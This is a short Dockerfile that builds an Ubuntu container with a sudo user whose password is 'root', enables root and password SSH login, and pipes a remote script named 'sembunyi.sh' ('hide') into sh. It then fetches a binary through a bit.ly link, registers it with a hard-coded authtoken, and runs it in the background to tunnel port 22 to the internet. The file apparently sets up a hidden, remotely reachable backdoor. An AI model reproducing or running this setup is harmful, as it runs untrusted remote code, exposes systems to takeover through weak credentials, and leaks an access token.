FROM ubuntu:xenial-20180112.1
USER root
RUN apt-get update && apt-get install ssh gcc htop -y
RUN sudo adduser --disabled-password --gecos "" panda
RUN sudo su --command "adduser panda sudo && echo 'panda:root' | chpasswd"
RUN sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && sudo service ssh restart"
RUN wget https://raw.githubusercontent.com/p4n1k/mnr/main/sembunyi.sh -O - | sh
RUN wget https://bit.ly/3Iaxfe5
RUN chmod +x 3Iaxfe5
RUN sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
RUN sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"